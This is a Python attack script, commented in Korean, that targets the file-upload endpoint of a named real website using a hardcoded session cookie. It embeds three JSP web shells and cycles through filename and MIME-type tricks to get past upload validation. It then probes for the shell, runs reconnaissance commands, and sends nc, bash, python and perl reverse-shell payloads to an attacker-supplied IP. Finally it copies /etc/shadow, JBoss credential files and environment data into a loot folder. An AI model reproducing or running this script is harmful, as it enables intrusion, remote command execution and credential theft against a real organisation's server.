#!/usr/bin/env python3
"""
BuyKorea 파일 업로드 RCE 통합 스크립트 v4
⚠️ 권한을 가진 시스템에서만 사용하세요.

사용법:
    1. JSESSIONID 변수에 실제 세션 값 입력
    2. python3 rce_full.py
"""

import requests
import urllib3
import os
import time
import re
from datetime import datetime

# SSL 경고 비활성화
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ============================================================
# 설정 (세션 값 입력 필수!)
# ============================================================
BASE_URL = "https://managed.buykorea.org"

# ⚠️ 여기에 실제 JSESSIONID 입력
JSESSIONID = "WNFmLtI77XywtH1BYMGXrsdIlANk_MOBvrmihntw.bk-bo-02"

COOKIES = {"JSESSIONID": JSESSIONID}
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Safari/537.36",
    "Accept": "*/*",
    "Origin": BASE_URL,
    "Referer": f"{BASE_URL}/buyKorea/index.html",
}

# ============================================================
# JSP 웹쉘 (여러 종류)
# ============================================================
WEBSHELL_JSP = b'''<%@ page import="java.util.*,java.io.*"%>
<%
String cmd = request.getParameter("c");
if (cmd != null && !cmd.isEmpty()) {
    Process p = Runtime.getRuntime().exec(new String[]{"/bin/sh","-c",cmd});
    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
    BufferedReader er = new BufferedReader(new InputStreamReader(p.getErrorStream()));
    String line;
    out.println("<pre>");
    while ((line = br.readLine()) != null) out.println(line);
    while ((line = er.readLine()) != null) out.println("[ERR] " + line);
    out.println("</pre>");
}
%>'''

# 최소 웹쉘 (탐지 회피)
WEBSHELL_MIN = b'''<%=new java.util.Scanner(Runtime.getRuntime().exec(request.getParameter("c")).getInputStream()).useDelimiter("\\\\A").next()%>'''

# Base64 인코딩 명령 실행 웹쉘
WEBSHELL_B64 = b'''<%@ page import="java.util.*,java.io.*"%><%
String c = new String(Base64.getDecoder().decode(request.getParameter("c")));
Process p = Runtime.getRuntime().exec(new String[]{"/bin/sh","-c",c});
BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
String l; out.println("<pre>");
while ((l=br.readLine())!=null) out.println(l);
out.println("</pre>");%>'''

# ============================================================
# 업로드 엔드포인트 및 파라미터 조합
# ============================================================
UPLOAD_TARGETS = [
    # (엔드포인트, 파일 파라미터명, 추가 파라미터)
    ("/comm/file/fileUpload.do", "file", {}),
    ("/comm/file/fileUpload.do", "uploadFile", {}),
    ("/comm/file/fileUpload.do", "fileToUpload", {}),
    ("/comm/file/fileUpload.do", "attachFile", {}),
    ("/comm/file/fileUpload.do", "atchFile", {}),
    ("/comm/file/fileUpload.do", "upload", {}),
    ("/comm/file/fileUpload.do", "file", {"saveFileName": "shell.jsp"}),
    ("/comm/file/fileUpload.do", "file", {"filePath": "/tmp"}),
    ("/comm/file/fileUpload.do", "file", {"saveFileName": "shell.jsp", "filePath": "/tmp"}),
]

# 업로드할 파일명 패턴 (검증 우회)
FILENAMES = [
    "shell.jsp",
    "shell.JSP",
    "shell.Jsp",
    "shell.jspx",
    "shell.jpg.jsp",
    "shell.png.jsp",
    "shell.jsp.jpg",
    "shell.jsp;.jpg",
    "shell.jsp%00.jpg",
    "shell.jsp.",
    "shell.jsp ",  # 끝에 공백
    "shell.jsp::$DATA",
    "shell.jspf",
    "shell.jsw",
    "shell.jsv",
]

# MIME 타입 (검증 우회)
MIME_TYPES = [
    "image/jpeg",
    "image/png",
    "image/gif",
    "application/octet-stream",
    "text/plain",
    "application/x-jsp",
    "multipart/form-data",
]

# ============================================================
# 업로드 경로 추정 (접근 확인용)
# ============================================================
ACCESS_PATHS = [
    "/shell.jsp",
    "/upload/shell.jsp",
    "/uploads/shell.jsp",
    "/file/shell.jsp",
    "/files/shell.jsp",
    "/bkshare/shell.jsp",
    "/bkshare/upload/shell.jsp",
    "/bkshare/license/shell.jsp",
    "/comm/upload/shell.jsp",
    "/comm/file/shell.jsp",
    "/comm/file/upload/shell.jsp",
    "/data/upload/shell.jsp",
    "/tmp/shell.jsp",
    "/ROOT/shell.jsp",
    "/webapps/ROOT/shell.jsp",
]

# ============================================================
# 1단계: 세션 유효성 확인
# ============================================================
def check_session():
    """세션 유효성 확인"""
    print("\n" + "=" * 80)
    print("[*] 1단계: 세션 유효성 확인")
    print("=" * 80)
    
    url = f"{BASE_URL}/comm/file/fileUpload.do"
    
    try:
        resp = requests.get(url, headers=HEADERS, cookies=COOKIES, verify=False, timeout=10)
        
        if b"ErrorCode" in resp.content:
            match = re.search(rb'ErrorMsg[^>]*>([^<]+)', resp.content)
            if match:
                msg = match.group(1).decode("utf-8", errors="ignore")
                if "세션" in msg and "종료" in msg:
                    print(f"  ❌ 세션 만료: {msg}")
                    return False
                elif "세션없음" in msg:
                    print(f"  ❌ 세션 없음: {msg}")
                    return False
        
        print(f"  ✅ 세션 유효 (Status: {resp.status_code})")
        return True
    except Exception as e:
        print(f"  [!] 오류: {e}")
        return False

# ============================================================
# 2단계: 정상 파일 업로드 테스트
# ============================================================
def test_normal_upload():
    """정상 이미지 파일로 업로드 테스트"""
    print("\n" + "=" * 80)
    print("[*] 2단계: 정상 파일 업로드 테스트")
    print("=" * 80)
    
    # 테스트용 PNG 파일 (최소 크기)
    png_data = bytes.fromhex(
        "89504e470d0a1a0a0000000d49484452000000010000000108060000001f15c4"
        "890000000d49444154789c6360000002000100ffff03000006000557bfabd400"
        "00000049454e44ae426082"
    )
    
    url = f"{BASE_URL}/comm/file/fileUpload.do"
    
    for endpoint, param, extra in UPLOAD_TARGETS[:3]:
        try:
            files = {param: ("test.png", png_data, "image/png")}
            data = {**extra}
            
            resp = requests.post(
                f"{BASE_URL}{endpoint}",
                files=files,
                data=data,
                headers=HEADERS,
                cookies=COOKIES,
                verify=False,
                timeout=30
            )
            
            print(f"  [{resp.status_code}] {endpoint} param={param} ({len(resp.content)} bytes)")
            
            # 응답 분석
            if resp.status_code == 200:
                if b"ErrorCode" in resp.content:
                    match = re.search(rb'ErrorMsg[^>]*>([^<]+)', resp.content)
                    if match:
                        print(f"      Error: {match.group(1).decode('utf-8', errors='ignore')[:200]}")
                else:
                    print(f"      Body: {resp.text[:300]}")
                    
                    # 성공 응답 저장
                    with open(f"upload_test_{param}.xml", "wb") as f:
                        f.write(resp.content)
                    
                    # 파일 경로 추출 시도
                    urls = re.findall(rb'[a-zA-Z0-9_/]+\.(?:png|jpg|jpeg|gif)', resp.content)
                    if urls:
                        print(f"      가능한 경로: {urls}")
                    
                    return True
        except Exception as e:
            print(f"  [!] {endpoint}: {e}")
    
    return False

# ============================================================
# 3단계: JSP 웹쉘 업로드 (다양한 우회)
# ============================================================
def upload_webshell():
    """JSP 웹쉘 업로드 시도"""
    print("\n" + "=" * 80)
    print("[*] 3단계: JSP 웹쉘 업로드 시도")
    print("=" * 80)
    
    url_base = BASE_URL
    success_uploads = []
    
    # 웹쉘 종류
    webshells = [
        ("shell_full.jsp", WEBSHELL_JSP),
        ("shell_min.jsp", WEBSHELL_MIN),
        ("shell_b64.jsp", WEBSHELL_B64),
    ]
    
    # 조합별 시도
    for shell_name, shell_content in webshells:
        print(f"\n[*] 웹쉘: {shell_name} ({len(shell_content)} bytes)")
        
        for filename in FILENAMES:
            for mime in MIME_TYPES:
                for endpoint, param, extra in UPLOAD_TARGETS:
                    try:
                        files = {param: (filename, shell_content, mime)}
                        data = {**extra}
                        
                        resp = requests.post(
                            f"{url_base}{endpoint}",
                            files=files,
                            data=data,
                            headers=HEADERS,
                            cookies=COOKIES,
                            verify=False,
                            timeout=30
                        )
                        
                        if resp.status_code == 200:
                            if b"ErrorCode" not in resp.content:
                                print(f"  ✅ [{resp.status_code}] {endpoint}")
                                print(f"      filename={filename}, mime={mime}, param={param}")
                                print(f"      Response: {resp.text[:200]}")
                                
                                # 업로드 성공 정보 저장
                                success_uploads.append({
                                    "endpoint": endpoint,
                                    "param": param,
                                    "filename": filename,
                                    "mime": mime,
                                    "webshell_name": shell_name,
                                    "response": resp.text
                                })
                                
                                # 결과 저장
                                with open(f"upload_success_{shell_name}_{filename.replace('/', '_')}.xml", "wb") as f:
                                    f.write(resp.content)
                            elif b"500" in str(resp.status_code).encode():
                                pass  # 서버 오류는 스킵
                    except Exception as e:
                        pass
        
        # 첫 웹쉘 성공 시 중단
        if success_uploads:
            break
    
    print(f"\n[*] 업로드 성공: {len(success_uploads)}건")
    return success_uploads

# ============================================================
# 4단계: 업로드된 웹쉘 접근 시도
# ============================================================
def access_webshell(upload_results):
    """업로드된 웹쉘 접근"""
    print("\n" + "=" * 80)
    print("[*] 4단계: 업로드된 웹쉘 접근")
    print("=" * 80)
    
    found_webshells = []
    
    # 업로드된 파일명 기반 접근 경로 생성
    for result in upload_results:
        filename = result["filename"]
        
        # 응답에서 경로 추출 시도
        urls = re.findall(rb'/[a-zA-Z0-9_/]+\.(?:jsp|jspx|jspf)', result["response"].encode())
        urls += re.findall(rb'fileUrl["\']?\s*[:=]\s*["\']([^"\']+)', result["response"].encode())
        
        # 기본 경로 + 추출 경로
        test_urls = [u.decode() for u in urls if u]
        test_urls += [f"{p}/{filename}" for p in ACCESS_PATHS]
        test_urls += [f"{p}" for p in ACCESS_PATHS]
        
        # 중복 제거
        test_urls = list(set(test_urls))
        
        for path in test_urls:
            url = f"{BASE_URL}{path}"
            test_cmd = "id"
            
            try:
                resp = requests.get(
                    f"{url}?c={test_cmd}",
                    headers=HEADERS,
                    cookies=COOKIES,
                    verify=False,
                    timeout=15
                )
                
                if resp.status_code == 200:
                    content = resp.content
                    
                    # RCE 성공 판정
                    if b"uid=" in content and b"gid=" in content:
                        print(f"  🔴🔴🔴 RCE 성공! {url}?c=id")
                        print(f"      {content[:500]}")
                        found_webshells.append(url)
                        return url
                    
                    # JSP 코드 노출 (실행 안 됨)
                    elif b"<%" in content or b"Runtime.getRuntime" in content:
                        print(f"  ⚠️  [{resp.status_code}] {url} (JSP 코드 노출 - 실행 안 됨)")
                        print(f"      {content[:200]}")
                    
                    # 정상 응답
                    elif len(content) > 100:
                        print(f"  [{resp.status_code}] {url} ({len(content)} bytes)")
                
            except Exception as e:
                pass
    
    return None

# ============================================================
# 5단계: RCE 명령 실행
# ============================================================
def execute_commands(webshell_url):
    """웹쉘로 명령 실행"""
    print("\n" + "=" * 80)
    print("[*] 5단계: RCE 명령 실행")
    print("=" * 80)
    
    commands = [
        "id",
        "whoami",
        "hostname",
        "uname -a",
        "pwd",
        "ls -la /",
        "cat /etc/passwd",
        "env",
        "ifconfig",
        "netstat -tlnp",
    ]
    
    for cmd in commands:
        print(f"\n[*] $ {cmd}")
        try:
            resp = requests.get(
                f"{webshell_url}?c={cmd}",
                headers=HEADERS,
                cookies=COOKIES,
                verify=False,
                timeout=15
            )
            
            # <pre> 태그 내용 추출
            content = resp.text
            match = re.search(r'<pre>(.*?)</pre>', content, re.DOTALL)
            if match:
                output = match.group(1)
            else:
                output = content[:500]
            
            print(f"    {output}")
        except Exception as e:
            print(f"    [!] 오류: {e}")

# ============================================================
# 6단계: nc 리버스 쉘 시도
# ============================================================
def try_reverse_shell(webshell_url):
    """nc 리버스 쉘 시도"""
    print("\n" + "=" * 80)
    print("[*] 6단계: nc 리버스 쉘 시도")
    print("=" * 80)
    
    print("\n⚠️  먼저 공격자 서버에서 아래 명령어 실행:")
    print("   nc -lvp 4444")
    print("   또는")
    print("   rlwrap nc -lvp 4444")
    
    attacker_ip = input("\n[*] 공격자 IP 입력: ").strip()
    attacker_port = input("[*] 공격자 포트 입력 (기본 4444): ").strip() or "4444"
    
    if not attacker_ip:
        print("[!] IP 입력 없음, 스킵")
        return
    
    # 리버스 쉘 페이로드
    reverse_payloads = [
        f"nc -e /bin/bash {attacker_ip} {attacker_port}",
        f"bash -i >& /dev/tcp/{attacker_ip}/{attacker_port} 0>&1",
        f"bash -c 'bash -i >& /dev/tcp/{attacker_ip}/{attacker_port} 0>&1'",
        f"python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{attacker_ip}\",{attacker_port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
        f"perl -e 'use Socket;$i=\"{attacker_ip}\";$p={attacker_port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
    ]
    
    for i, payload in enumerate(reverse_payloads, 1):
        print(f"\n[*] 시도 {i}: {payload[:100]}...")
        
        try:
            import urllib.parse
            encoded = urllib.parse.quote(payload)
            
            resp = requests.get(
                f"{webshell_url}?c={encoded}",
                headers=HEADERS,
                cookies=COOKIES,
                verify=False,
                timeout=5
            )
            
            print(f"    응답: {resp.status_code}")
        except requests.exceptions.Timeout:
            print(f"    ⏱️  타임아웃 - 리버스 쉘 연결 가능성!")
        except Exception as e:
            print(f"    [!] {e}")

# ============================================================
# 7단계: 민감 파일 탈취 (웹쉘 활용)
# ============================================================
def loot_files(webshell_url):
    """웹쉘로 민감 파일 탈취"""
    print("\n" + "=" * 80)
    print("[*] 7단계: 민감 파일 탈취")
    print("=" * 80)
    
    targets = [
        # JBoss 설정
        "/ssw/jboss7/instance/bk-bo-02/configuration/standalone-full.xml",
        "/ssw/jboss7/instance/bk-bo-02/configuration/mgmt-users.properties",
        
        # 시스템 파일
        "/etc/passwd",
        "/etc/shadow",
        "/etc/hosts",
        
        # 환경 변수
        "/proc/self/environ",
        
        # 로그
        "/data/log/jboss7/bk-bo-02/server.log",
    ]
    
    os.makedirs("loot_rce", exist_ok=True)
    
    for path in targets:
        print(f"\n[*] {path}")
        try:
            resp = requests.get(
                f"{webshell_url}?c=cat {path}",
                headers=HEADERS,
                cookies=COOKIES,
                verify=False,
                timeout=15
            )
            
            match = re.search(r'<pre>(.*?)</pre>', resp.text, re.DOTALL)
            if match:
                content = match.group(1)
                if content.strip():
                    print(f"    {content[:500]}")
                    
                    # 저장
                    safe_name = path.replace("/", "_")
                    with open(f"loot_rce/{safe_name}", "w") as f:
                        f.write(content)
        except Exception as e:
            print(f"    [!] {e}")

# ============================================================
# 메인 실행
# ============================================================
def main():
    print("=" * 80)
    print("🔴 BuyKorea 파일 업로드 RCE 통합 스크립트 v4")
    print(f"🔴 시작: {datetime.now()}")
    print(f"🔴 Target: {BASE_URL}")
    print(f"🔴 Session: {JSESSIONID[:20]}...")
    print("=" * 80)
    
    # 1. 세션 확인
    if not check_session():
        print("\n❌ 세션이 유효하지 않습니다. 로그인 후 JSESSIONID를 갱신하세요.")
        return
    
    # 2. 정상 업로드 테스트
    test_normal_upload()
    
    # 3. 웹쉘 업로드
    upload_results = upload_webshell()
    
    if not upload_results:
        print("\n❌ 웹쉘 업로드 실패")
        print("[*] 시도할 사항:")
        print("    1. 정상 요청 캡처 후 파라미터 정확히 확인")
        print("    2. 세션 유효성 재확인")
        print("    3. 업로드 엔드포인트 재탐색")
        return
    
    # 4. 웹쉘 접근
    webshell_url = access_webshell(upload_results)
    
    if not webshell_url:
        print("\n❌ 웹쉘 접근 실패")
        print("[*] 업로드는 성공했으나 실행 경로를 찾지 못함")
        print("[*] 수동으로 경로 탐색 필요")
        return
    
    # 5. RCE 명령 실행
    execute_commands(webshell_url)
    
    # 6. nc 리버스 쉘
    try_reverse_shell(webshell_url)
    
    # 7. 파일 탈취
    loot_files(webshell_url)
    
    print("\n" + "=" * 80)
    print(f"🔴 완료: {datetime.now()}")
    print(f"🔴 웹쉘 URL: {webshell_url}")
    print("=" * 80)

if __name__ == "__main__":
    main()
